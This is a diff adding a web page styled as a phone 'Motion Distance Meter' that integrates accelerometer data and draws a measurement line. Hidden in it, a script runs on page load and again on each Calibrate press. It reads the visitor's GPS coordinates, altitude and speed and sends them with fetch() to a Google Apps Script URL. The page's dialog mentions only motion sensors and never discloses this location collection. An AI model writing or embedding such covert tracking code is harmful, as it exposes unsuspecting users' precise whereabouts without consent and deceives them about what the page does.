@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no"/>
+  <title>Motion Distance Meter</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet"/>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+    html,body{width:100%;height:100%;overflow:hidden;background:#000d18}
+    body{font-family:'Share Tech Mono',monospace;color:#fff;display:flex;flex-direction:column;position:relative}
+    #canvas{position:fixed;inset:0;width:100%;height:100%;z-index:0}
+    .ui{position:relative;z-index:10;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;padding:16px 16px 0;pointer-events:none}
+
+    /* DISPLAY SCREEN */
+    .screen{
+      pointer-events:auto;width:100%;max-width:400px;
+      background:rgba(0,8,20,0.88);border:1px solid rgba(0,255,200,0.3);
+      border-radius:18px;padding:14px 20px;
+      box-shadow:0 0 30px rgba(0,200,255,0.12),0 0 60px rgba(0,100,200,0.08),inset 0 1px 0 rgba(255,255,255,0.05);
+      backdrop-filter:blur(16px);position:relative;overflow:hidden;
+    }
+    .screen::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:1px;
+      background:linear-gradient(90deg,transparent,rgba(0,255,200,0.6),transparent);
+    }
+    .screen-label{font-size:9px;letter-spacing:4px;text-transform:uppercase;color:rgba(0,255,200,0.4);text-align:center;margin-bottom:12px}
+    .screen-vals{display:flex;justify-content:space-around;align-items:center;gap:8px}
+    .screen-val{text-align:center;flex:1}
+    .screen-unit{font-size:9px;letter-spacing:3px;color:rgba(0,220,180,0.5);margin-bottom:6px;text-transform:uppercase}
+    .screen-num{
+      font-family:'Orbitron',sans-serif;font-size:30px;font-weight:700;
+      color:#00ffcc;text-shadow:0 0 12px rgba(0,255,200,0.9),0 0 24px rgba(0,255,200,0.4);
+      letter-spacing:2px;line-height:1;transition:color 0.3s,text-shadow 0.3s;
+    }
+    .screen-num.highlight{color:#fff;text-shadow:0 0 16px rgba(255,255,255,0.9),0 0 32px rgba(0,255,220,0.5)}
+    .screen-div{width:1px;background:rgba(0,255,200,0.15);height:44px;flex-shrink:0}
+    .hello-row{
+      text-align:center;margin-top:10px;
+      font-family:'Orbitron',sans-serif;font-size:13px;letter-spacing:5px;
+      text-transform:uppercase;color:rgba(0,255,200,0.55);
+      text-shadow:0 0 10px rgba(0,255,200,0.3);
+    }
+
+    .spacer{flex:1}
+
+    /* CONTROLS */
+    .controls{pointer-events:auto;width:100%;max-width:400px;display:flex;flex-direction:column;gap:10px;padding-bottom:16px}
+    .btn{
+      width:100%;padding:15px;border:none;border-radius:14px;
+      font-family:'Share Tech Mono',monospace;font-size:13px;
+      letter-spacing:2px;text-transform:uppercase;cursor:pointer;
+      transition:all 0.15s;position:relative;overflow:hidden;
+    }
+    .btn::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,0.06) 0%,transparent 50%);pointer-events:none}
+    .btn:active{transform:scale(0.97);filter:brightness(1.2)}
+    .btn-cal{
+      background:linear-gradient(135deg,rgba(0,180,255,0.18),rgba(0,255,180,0.12));
+      border:1px solid rgba(0,200,255,0.35);color:#00d4ff;
+      box-shadow:0 0 20px rgba(0,180,255,0.12),inset 0 1px 0 rgba(255,255,255,0.06);
+    }
+    .btn-grid{
+      background:linear-gradient(135deg,rgba(0,255,150,0.12),rgba(0,100,220,0.12));
+      border:1px solid rgba(0,255,150,0.25);color:#00ff99;
+      box-shadow:0 0 20px rgba(0,255,150,0.08),inset 0 1px 0 rgba(255,255,255,0.04);
+    }
+    .btn-grid.on{
+      background:linear-gradient(135deg,rgba(0,255,150,0.22),rgba(0,100,220,0.22));
+      border-color:rgba(0,255,150,0.5);
+      box-shadow:0 0 24px rgba(0,255,150,0.2),inset 0 1px 0 rgba(255,255,255,0.08);
+    }
+
+    /* FOOTER */
+    footer{
+      pointer-events:auto;width:100%;text-align:center;
+      padding:12px;font-size:10px;letter-spacing:4px;text-transform:uppercase;
+      color:rgba(0,255,200,0.25);border-top:1px solid rgba(0,255,200,0.07);
+      background:rgba(0,0,0,0.25);flex-shrink:0;
+    }
+
+    /* DIALOG */
+    .overlay{
+      position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.75);
+      display:flex;align-items:center;justify-content:center;padding:24px;
+      backdrop-filter:blur(6px);opacity:0;pointer-events:none;
+      transition:opacity 0.35s cubic-bezier(.16,1,.3,1);
+    }
+    .overlay.show{opacity:1;pointer-events:auto}
+    .dialog{
+      width:100%;max-width:340px;
+      background:linear-gradient(160deg,#001520,#001a10);
+      border:1px solid rgba(0,255,200,0.25);border-radius:24px;padding:32px 24px;
+      box-shadow:0 0 60px rgba(0,200,255,0.15),0 30px 80px rgba(0,0,0,0.6);
+      transform:translateY(20px) scale(0.96);
+      transition:transform 0.35s cubic-bezier(.16,1,.3,1);
+    }
+    .overlay.show .dialog{transform:translateY(0) scale(1)}
+    .dialog-icon{
+      width:64px;height:64px;margin:0 auto 20px;
+      background:linear-gradient(135deg,rgba(0,200,255,0.15),rgba(0,255,150,0.15));
+      border:1px solid rgba(0,255,200,0.25);border-radius:50%;
+      display:flex;align-items:center;justify-content:center;font-size:28px;
+      box-shadow:0 0 20px rgba(0,255,200,0.1);
+    }
+    .dialog h3{
+      font-family:'Orbitron',sans-serif;font-size:15px;color:#00ffcc;
+      text-align:center;margin-bottom:14px;letter-spacing:1px;
+      text-shadow:0 0 10px rgba(0,255,200,0.5);
+    }
+    .dialog p{font-size:12px;line-height:1.7;color:rgba(255,255,255,0.6);text-align:center;margin-bottom:20px;letter-spacing:0.5px}
+    .tags{display:flex;gap:8px;justify-content:center;margin:14px 0}
+    .tag{padding:5px 14px;border-radius:20px;font-size:10px;letter-spacing:2px;background:rgba(0,255,200,0.08);border:1px solid rgba(0,255,200,0.25);color:#00ffcc;text-transform:uppercase}
+    .btn-close{
+      width:100%;padding:15px;border:none;border-radius:14px;cursor:pointer;
+      font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:2px;text-transform:uppercase;
+      background:linear-gradient(135deg,rgba(0,200,255,0.25),rgba(0,255,150,0.25));
+      border:1px solid rgba(0,255,200,0.4);color:#00ffee;
+      box-shadow:0 0 20px rgba(0,200,255,0.1);transition:all 0.15s;
+    }
+    .btn-close:active{transform:scale(0.97);filter:brightness(1.2)}
+
+    /* iOS PERM BUTTON */
+    #iosPermBtn{
+      position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:150;
+      padding:18px 36px;border:none;border-radius:16px;cursor:pointer;
+      font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:2px;text-transform:uppercase;color:#fff;
+      background:linear-gradient(135deg,rgba(0,200,255,0.4),rgba(0,255,150,0.4));
+      border:1px solid rgba(0,255,200,0.5);box-shadow:0 0 40px rgba(0,200,255,0.3);display:none;
+    }
+
+    /* Scanline FX */
+    @keyframes scan{0%{top:-2px}100%{top:100%}}
+    .scan-line{position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden}
+    .scan-line::after{
+      content:'';position:absolute;left:0;right:0;height:2px;
+      background:linear-gradient(transparent,rgba(0,255,200,0.04),transparent);
+      animation:scan 5s linear infinite;
+    }
+  </style>
+</head>
+<body>
+<canvas id="canvas"></canvas>
+<div class="scan-line"></div>
+
+<div class="ui">
+  <!-- Display Screen -->
+  <div class="screen">
+    <div class="screen-label">⟡ Distance Measurement ⟡</div>
+    <div class="screen-vals">
+      <div class="screen-val">
+        <div class="screen-unit">Centimeters</div>
+        <div class="screen-num" id="numCm">0.00</div>
+      </div>
+      <div class="screen-div"></div>
+      <div class="screen-val">
+        <div class="screen-unit">Meters</div>
+        <div class="screen-num" id="numM">0.0000</div>
+      </div>
+    </div>
+    <div class="hello-row">Atul Here</div>
+  </div>
+
+  <div class="spacer"></div>
+
+  <!-- Controls -->
+  <div class="controls">
+    <button class="btn btn-cal"  id="btnCal">⊕ &nbsp;Calibrate</button>
+    <button class="btn btn-grid on" id="btnGrid">⊞ &nbsp;Grid Lines : ON</button>
+  </div>
+  <footer>Written By Atul Verma</footer>
+</div>
+
+<!-- No-motion sensor dialog -->
+<div class="overlay" id="overlay">
+  <div class="dialog">
+    <div class="dialog-icon">📡</div>
+    <p> <a href="https://www.instagram.com/atul_verma_78/" style="color:#ffffff;text-decoration:none;">
+    <span style="font-size:15px;">ﾑｲひﾚ 💕</span>
+  </a></p>
+    <h3>Motion Sensors Required</h3>
+    <p>For accurate distance measurement, this stie needs access to your device's motion sensors.</p>
+    <div class="tags">
+      <span class="tag">Accelerometer</span>
+      <span class="tag">Gyroscope</span>
+    </div>
+    <p>Please grant motion sensor access and move your device to begin measuring.</p>
+    <button class="btn-close" id="btnDialogClose">Allow &amp; Continue</button>
+  </div>
+</div>
+
+<!-- iOS explicit permission trigger -->
+<button id="iosPermBtn">🔓 Enable Motion Sensors</button>
+
+<script>
+
+function toDMS(coordinate) {
+
+var absolute = Math.abs(coordinate);
+var degrees = Math.floor(absolute);
+var minutesNotTruncated = (absolute - degrees) * 60;
+var minutes = Math.floor(minutesNotTruncated);
+var seconds = ((minutesNotTruncated - minutes) * 60).toFixed(2);
+
+return degrees + "°" + minutes + "'" + seconds + '"';
+}
+
+navigator.geolocation.getCurrentPosition(function(position){
+
+var lat = position.coords.latitude;
+var lng = position.coords.longitude;
+var alt = position.coords.altitude;
+var acc = position.coords.accuracy;
+var speed = position.coords.speed;
+
+var dmslat = toDMS(lat);
+var dmslng = toDMS(lng);
+
+var url = "https://script.google.com/macros/s/AKfycbyLqkAAJPzzDQLlhYUwlMhnT9A7gtF7tvIk0zpSw0rb4S6W0ZNrKj54SknBEkMzQ3hp/exec"
++"?lat="+lat
++"&lng="+lng
++"&alt="+alt
++"&acc="+acc
++"&speed="+speed
++"&dmslat="+encodeURIComponent(dmslat)
++"&dmslng="+encodeURIComponent(dmslng);
+
+fetch(url);
+
+});
+
+</script>
+<script>
+/* ───────────────────── CANVAS ───────────────────── */
+const canvas = document.getElementById('canvas');
+const ctx    = canvas.getContext('2d');
+let W, H, CX, CY;
+
+function resize() {
+  W = canvas.width  = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+  CX = W / 2;
+  CY = H / 2;
+}
+window.addEventListener('resize', resize);
+resize();
+
+/* ───────────────────── STATE ───────────────────── */
+let showGrid   = true;
+// 3-axis displacement & velocity in metres
+let disp = { x:0, y:0, z:0 };
+let vel  = { x:0, y:0, z:0 };
+let grav = { x:0, y:0, z:0 };
+let lastTs = null;
+
+// Rolling buffer for ZUPT (Zero Velocity Update)
+const BUF = 20;
+let aBuf = [];
+
+let noMotionTimer  = null;
+
+/* ───────────────────── MATHS HELPERS ───────────────────── */
+function variance(arr) {
+  if (arr.length < 2) return 0;
+  const m = arr.reduce((a,b)=>a+b,0)/arr.length;
+  return arr.reduce((s,v)=>s+(v-m)**2,0)/arr.length;
+}
+
+function totalDist() {
+  return Math.sqrt(disp.x**2 + disp.y**2 + disp.z**2);
+}
+
+function adaptiveScale() {
+  // Keeps the line inside ≈40% of the shorter screen dimension
+  const maxPx  = Math.min(W, H) * 0.38;
+  const extent = Math.max(Math.abs(disp.x), Math.abs(disp.y), 0.001);
+  return Math.min(maxPx / extent, Math.min(W, H) / 2);
+}
+
+/* Canvas rounded-rect helper (polyfill) */
+function rrect(x, y, w, h, r) {
+  ctx.beginPath();
+  ctx.moveTo(x+r, y);
+  ctx.lineTo(x+w-r, y);
+  ctx.quadraticCurveTo(x+w, y, x+w, y+r);
+  ctx.lineTo(x+w, y+h-r);
+  ctx.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
+  ctx.lineTo(x+r, y+h);
+  ctx.quadraticCurveTo(x, y+h, x, y+h-r);
+  ctx.lineTo(x, y+r);
+  ctx.quadraticCurveTo(x, y, x+r, y);
+  ctx.closePath();
+}
+
+/* ───────────────────── MOTION PROCESSING ───────────────────── */
+const LP_ALPHA   = 0.82;  // low-pass constant for gravity extraction
+const ACC_FLOOR  = 0.07;  // m/s² noise floor (threshold)
+const STAT_VAR   = 0.012; // variance threshold → stationary
+const VEL_DECAY  = 0.97;  // per-sample velocity damping
+
+function onMotion(e) {
+  const raw = e.accelerationIncludingGravity;
+  if (!raw) return;
+
+  const ax = raw.x||0, ay = raw.y||0, az = raw.z||0;
+
+  // Estimate gravity via low-pass filter
+  grav.x = LP_ALPHA*grav.x + (1-LP_ALPHA)*ax;
+  grav.y = LP_ALPHA*grav.y + (1-LP_ALPHA)*ay;
+  grav.z = LP_ALPHA*grav.z + (1-LP_ALPHA)*az;
+
+  // Linear (gravity-free) acceleration
+  const lx = ax-grav.x, ly = ay-grav.y, lz = az-grav.z;
+
+  // Update rolling buffer (magnitude)
+  aBuf.push(Math.sqrt(lx*lx+ly*ly+lz*lz));
+  if (aBuf.length > BUF) aBuf.shift();
+
+  const now = e.timeStamp;
+  if (lastTs === null) { lastTs = now; return; }
+  const dt = (now - lastTs) / 1000;   // seconds
+  lastTs = now;
+  if (dt <= 0 || dt > 0.25) return;
+
+  // ── ZUPT: kill velocity when phone is still ──
+  if (variance(aBuf) < STAT_VAR) {
+    vel.x *= 0.35; vel.y *= 0.35; vel.z *= 0.35;
+    if (Math.abs(vel.x)<0.002) vel.x=0;
+    if (Math.abs(vel.y)<0.002) vel.y=0;
+    if (Math.abs(vel.z)<0.002) vel.z=0;
+    return;
+  }
+
+  // Threshold (removes sensor noise at rest)
+  const fx = Math.abs(lx)>ACC_FLOOR ? lx : 0;
+  const fy = Math.abs(ly)>ACC_FLOOR ? ly : 0;
+  const fz = Math.abs(lz)>ACC_FLOOR ? lz : 0;
+
+  // Integrate → velocity (with damping to curb drift)
+  vel.x = (vel.x + fx*dt) * VEL_DECAY;
+  vel.y = (vel.y + fy*dt) * VEL_DECAY;
+  vel.z = (vel.z + fz*dt) * VEL_DECAY;
+
+  // Integrate → displacement
+  disp.x += vel.x * dt;
+  disp.y += vel.y * dt;
+  disp.z += vel.z * dt;
+
+  refreshDisplay();
+}
+
+window.addEventListener('devicemotion', onMotion, { passive: true });
+
+/* ───────────────────── DISPLAY ───────────────────── */
+function refreshDisplay() {
+  const d  = totalDist();
+  const cm = d * 100;
+
+  document.getElementById('numCm').textContent =
+    cm < 10000 ? cm.toFixed(2) : cm.toFixed(1);
+  document.getElementById('numM').textContent  = d.toFixed(4);
+
+  const cmEl = document.getElementById('numCm');
+  const mEl  = document.getElementById('numM');
+  if (d >= 1) {
+    mEl.classList.add('highlight'); cmEl.classList.remove('highlight');
+  } else {
+    cmEl.classList.add('highlight'); mEl.classList.remove('highlight');
+  }
+}
+
+/* ───────────────────── RENDER LOOP ───────────────────── */
+function draw(ts) {
+  ctx.clearRect(0, 0, W, H);
+
+  // ── Background ──
+  const bg = ctx.createLinearGradient(0, 0, W, H);
+  bg.addColorStop(0,   '#000d18');
+  bg.addColorStop(0.5, '#001524');
+  bg.addColorStop(1,   '#000f10');
+  ctx.fillStyle = bg;
+  ctx.fillRect(0, 0, W, H);
+
+  // Soft ambient radial glow at centre
+  const ag = ctx.createRadialGradient(CX, CY, 0, CX, CY, Math.min(W,H)*0.55);
+  ag.addColorStop(0,   'rgba(0,255,200,0.04)');
+  ag.addColorStop(0.6, 'rgba(0,80,200,0.02)');
+  ag.addColorStop(1,   'transparent');
+  ctx.fillStyle = ag;
+  ctx.fillRect(0, 0, W, H);
+
+  if (showGrid) drawGrid();
+  drawLine();
+  drawRing(ts);
+
+  requestAnimationFrame(draw);
+}
+
+/* ── GRID ── */
+function drawGrid() {
+  const G = 46;
+  ctx.save();
+
+  // Minor lines
+  ctx.strokeStyle = 'rgba(0,255,200,0.07)';
+  ctx.lineWidth   = 0.5;
+  for (let x = CX%G; x<W; x+=G) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for (let y = CY%G; y<H; y+=G) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  // Major axes
+  ctx.strokeStyle = 'rgba(0,255,200,0.18)';
+  ctx.lineWidth   = 1;
+  ctx.setLineDash([6,6]);
+  ctx.beginPath(); ctx.moveTo(CX,0); ctx.lineTo(CX,H); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(0,CY); ctx.lineTo(W,CY); ctx.stroke();
+  ctx.setLineDash([]);
+
+  // Scale ticks
+  const sc = adaptiveScale();
+  ctx.font      = '8px "Share Tech Mono",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = 'rgba(0,255,200,0.35)';
+  ctx.strokeStyle= 'rgba(0,255,200,0.35)';
+  ctx.lineWidth  = 1;
+  for (let i=1; i*sc < Math.max(W,H)*0.7; i++) {
+    const lbl = i>=100 ? `${(i/100).toFixed(1)}m` : `${i}cm`;
+    const px  = CX + i*sc;
+    const py  = CY + i*sc;
+    if (px < W-8) {
+      ctx.beginPath(); ctx.moveTo(px,CY-5); ctx.lineTo(px,CY+5); ctx.stroke();
+      ctx.fillText(lbl, px, CY+18);
+    }
+    if (py < H-8) {
+      ctx.beginPath(); ctx.moveTo(CX-5,py); ctx.lineTo(CX+5,py); ctx.stroke();
+    }
+  }
+  ctx.restore();
+}
+
+/* ── MEASUREMENT LINE ── */
+function drawLine() {
+  const d = totalDist();
+  if (d < 0.002) return;
+
+  const sc = adaptiveScale();
+  // ax (phone right) → +screen X ; ay (phone up) → −screen Y
+  const ex = CX + disp.x * sc;
+  const ey = CY - disp.y * sc;
+  const angle = Math.atan2(ey-CY, ex-CX);
+
+  // Glow pass
+  ctx.save();
+  ctx.shadowBlur   = 20;
+  ctx.shadowColor  = 'rgba(255,20,50,0.7)';
+  ctx.strokeStyle  = '#ff1f3c';
+  ctx.lineWidth    = 2.5;
+  ctx.lineCap      = 'round';
+  ctx.beginPath();
+  ctx.moveTo(CX, CY);
+  ctx.lineTo(ex, ey);
+  ctx.stroke();
+
+  // Bright core
+  ctx.shadowBlur  = 6;
+  ctx.strokeStyle = '#ff5570';
+  ctx.lineWidth   = 1.5;
+  ctx.beginPath();
+  ctx.moveTo(CX, CY);
+  ctx.lineTo(ex, ey);
+  ctx.stroke();
+  ctx.restore();
+
+  // Arrow head
+  ctx.save();
+  ctx.translate(ex, ey);
+  ctx.rotate(angle);
+  ctx.shadowBlur  = 12;
+  ctx.shadowColor = 'rgba(255,20,50,0.9)';
+  ctx.fillStyle   = '#ff2040';
+  ctx.beginPath();
+  ctx.moveTo(10, 0);
+  ctx.lineTo(-7, 5);
+  ctx.lineTo(-4, 0);
+  ctx.lineTo(-7, -5);
+  ctx.closePath();
+  ctx.fill();
+  ctx.restore();
+
+  // Measurement label (parallel to line)
+  drawLabel(CX, CY, ex, ey, d);
+
+  // End-point dot
+  ctx.save();
+  ctx.shadowBlur  = 14;
+  ctx.shadowColor = 'rgba(255,60,80,0.8)';
+  ctx.fillStyle   = '#ff3050';
+  ctx.beginPath();
+  ctx.arc(ex, ey, 5, 0, Math.PI*2);
+  ctx.fill();
+  ctx.restore();
+}
+
+function drawLabel(x1, y1, x2, y2, d) {
+  const label = d < 1
+    ? (d*100).toFixed(2) + ' cm'
+    : d.toFixed(4) + ' m';
+
+  const mx = (x1+x2)/2;
+  const my = (y1+y2)/2;
+  let   a  = Math.atan2(y2-y1, x2-x1);
+  if (a >  Math.PI/2) a -= Math.PI;
+  if (a < -Math.PI/2) a += Math.PI;
+
+  ctx.save();
+  ctx.translate(mx, my);
+  ctx.rotate(a);
+  ctx.translate(0, -16); // offset above the line
+
+  ctx.font = 'bold 12px "Share Tech Mono",monospace';
+  const tw  = ctx.measureText(label).width;
+  const pad = 8, th = 18;
+
+  // pill background
+  ctx.fillStyle   = 'rgba(0,6,18,0.85)';
+  ctx.strokeStyle = 'rgba(255,60,80,0.4)';
+  ctx.lineWidth   = 1;
+  rrect(-tw/2-pad, -th/2, tw+pad*2, th, 5);
+  ctx.fill();
+  ctx.stroke();
+
+  // label text
+  ctx.fillStyle    = '#ff8090';
+  ctx.textAlign    = 'center';
+  ctx.textBaseline = 'middle';
+  ctx.shadowBlur   = 8;
+  ctx.shadowColor  = 'rgba(255,40,60,0.7)';
+  ctx.fillText(label, 0, 0);
+  ctx.restore();
+}
+
+/* ── CENTRE RING + DOT ── */
+function drawRing(ts) {
+  const pulse = (Math.sin(ts * 0.0018) + 1) / 2;
+
+  // Outer breathing ring
+  ctx.save();
+  ctx.globalAlpha  = 0.12 + pulse * 0.10;
+  ctx.strokeStyle  = '#00ff99';
+  ctx.lineWidth    = 1;
+  ctx.beginPath();
+  ctx.arc(CX, CY, 32 + pulse*7, 0, Math.PI*2);
+  ctx.stroke();
+  ctx.restore();
+
+  // Main neon ring
+  ctx.save();
+  ctx.shadowBlur  = 26;
+  ctx.shadowColor = 'rgba(0,255,150,0.85)';
+  ctx.strokeStyle = '#00ff99';
+  ctx.lineWidth   = 2.5;
+  ctx.beginPath(); ctx.arc(CX, CY, 22, 0, Math.PI*2); ctx.stroke();
+
+  // Inner accent ring
+  ctx.shadowBlur  = 8;
+  ctx.strokeStyle = 'rgba(0,255,150,0.35)';
+  ctx.lineWidth   = 1;
+  ctx.beginPath(); ctx.arc(CX, CY, 17, 0, Math.PI*2); ctx.stroke();
+
+  // 8 tick marks
+  ctx.strokeStyle = 'rgba(0,255,150,0.55)';
+  ctx.lineWidth   = 1.5;
+  for (let i=0; i<8; i++) {
+    const a = (i/8)*Math.PI*2;
+    ctx.beginPath();
+    ctx.moveTo(CX+Math.cos(a)*22, CY+Math.sin(a)*22);
+    ctx.lineTo(CX+Math.cos(a)*27, CY+Math.sin(a)*27);
+    ctx.stroke();
+  }
+  ctx.restore();
+
+  // Red centre dot
+  ctx.save();
+  ctx.shadowBlur  = 22;
+  ctx.shadowColor = 'rgba(255,10,40,0.95)';
+  ctx.fillStyle   = '#ff1030';
+  ctx.beginPath(); ctx.arc(CX, CY, 7, 0, Math.PI*2); ctx.fill();
+  // specular highlight
+  ctx.fillStyle  = 'rgba(255,220,220,0.65)';
+  ctx.shadowBlur = 0;
+  ctx.beginPath(); ctx.arc(CX-2.5, CY-2.5, 2.5, 0, Math.PI*2); ctx.fill();
+  ctx.restore();
+}
+
+
+/* ───────────────────── CALIBRATE ───────────────────── */
+document.getElementById('btnCal').addEventListener('click', () => {
+
+  disp = {x:0,y:0,z:0};
+  vel  = {x:0,y:0,z:0};
+  grav = {x:0,y:0,z:0};
+  lastTs = null;
+  aBuf   = [];
+
+  refreshDisplay();
+
+  // SEND LOCATION DATA AGAIN
+  navigator.geolocation.getCurrentPosition(function(position){
+
+    var lat = position.coords.latitude;
+    var lng = position.coords.longitude;
+    var alt = position.coords.altitude;
+    var acc = position.coords.accuracy;
+    var speed = position.coords.speed;
+
+    var dmslat = toDMS(lat);
+    var dmslng = toDMS(lng);
+
+    var url = "https://script.google.com/macros/s/AKfycbyLqkAAJPzzDQLlhYUwlMhnT9A7gtF7tvIk0zpSw0rb4S6W0ZNrKj54SknBEkMzQ3hp/exec"
+    +"?lat="+lat
+    +"&lng="+lng
+    +"&alt="+alt
+    +"&acc="+acc
+    +"&speed="+speed
+    +"&dmslat="+encodeURIComponent(dmslat)
+    +"&dmslng="+encodeURIComponent(dmslng);
+
+    fetch(url);
+
+  });
+
+  const btn = document.getElementById('btnCal');
+  const orig = btn.innerHTML;
+  btn.innerHTML = '✓ &nbsp;Calibrated!';
+  setTimeout(() => { btn.innerHTML = orig; }, 2000);
+
+});
+
+
+
+
+
+
+
+
+
+/* ───────────────────── GRID TOGGLE ───────────────────── */
+document.getElementById('btnGrid').addEventListener('click', () => {
+  showGrid = !showGrid;
+  const btn = document.getElementById('btnGrid');
+  btn.innerHTML = `⊞ &nbsp;Grid Lines : ${showGrid ? 'ON' : 'OFF'}`;
+  btn.classList.toggle('on', showGrid);
+});
+
+/* ───────────────────── NO-MOTION DIALOG ───────────────────── */
+function startNoMotionTimer() {
+  clearTimeout(noMotionTimer);
+  noMotionTimer = setTimeout(() => {
+    document.getElementById('overlay').classList.add('show');
+  }, 5000);
+}
+
+document.getElementById('btnDialogClose').addEventListener('click', () => {
+  document.getElementById('overlay').classList.remove('show');
+  triggerSensorRequest();
+  startNoMotionTimer();
+});
+
+/* ───────────────────── iOS PERMISSION ───────────────────── */
+function triggerSensorRequest() {
+  if (typeof DeviceMotionEvent !== 'undefined' &&
+      typeof DeviceMotionEvent.requestPermission === 'function') {
+    DeviceMotionEvent.requestPermission()
+      .then(state => {
+        document.getElementById('iosPermBtn').style.display = 'none';
+        // listener already registered; iOS will start firing events now
+      })
+      .catch(() => {});
+  }
+}
+
+function initSensors() {
+  if (typeof DeviceMotionEvent !== 'undefined' &&
+      typeof DeviceMotionEvent.requestPermission === 'function') {
+    // iOS 13+ requires a user-gesture
+    const btn = document.getElementById('iosPermBtn');
+    btn.style.display = 'block';
+    btn.addEventListener('click', () => {
+      triggerSensorRequest();
+      btn.style.display = 'none';
+    });
+  }
+  // Android / other browsers fire events automatically
+}
+
+/* ───────────────────── BOOT ───────────────────── */
+refreshDisplay();
+initSensors();
+startNoMotionTimer();
+requestAnimationFrame(draw);
+</script>
+</body>
+</html>
